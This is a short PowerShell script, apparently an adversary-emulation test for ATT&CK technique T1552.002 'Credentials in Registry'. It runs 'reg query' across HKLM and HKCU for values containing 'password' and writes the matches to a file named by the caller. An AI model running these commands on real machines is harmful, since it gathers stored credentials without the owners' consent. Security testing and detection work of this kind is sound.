'***********T1552_002_1---Credentials in Registry**********'| Out-File -FilePath $args[0]
cmd.exe /c 'reg query HKLM /f password /t REG_SZ /s' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'reg query HKCU /f password /t REG_SZ /s' |  Out-File -FilePath $args[0] -Append
